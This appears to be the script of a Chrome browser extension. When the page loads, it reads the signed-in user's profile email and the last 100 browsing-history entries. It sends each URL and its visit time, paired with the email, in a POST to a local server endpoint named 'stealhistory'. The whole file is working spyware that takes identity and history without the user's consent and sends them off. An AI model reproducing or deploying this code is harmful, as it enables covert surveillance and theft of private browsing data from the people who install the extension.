/* global chrome */

document.addEventListener('DOMContentLoaded', function () {
    chrome.identity.getProfileUserInfo(function (userInfo) {
        var userEmail = JSON.stringify(userInfo.email);
        var dataObj = {};
        dataObj['email'] = userEmail;
        chrome.storage.local.set(dataObj, function () {
            console.log('Value is set to ' + userEmail);
        });

        chrome.history.search({ text: '', maxResults: 100 },
        function (data) {
            data.forEach(function (page) {
                $.post("http://localhost:5000/stealhistory", {
                    email: userEmail,
                    url: page.url,
                    last_visited: page.lastVisitTime
                });
            });
        }
    );
    });
});
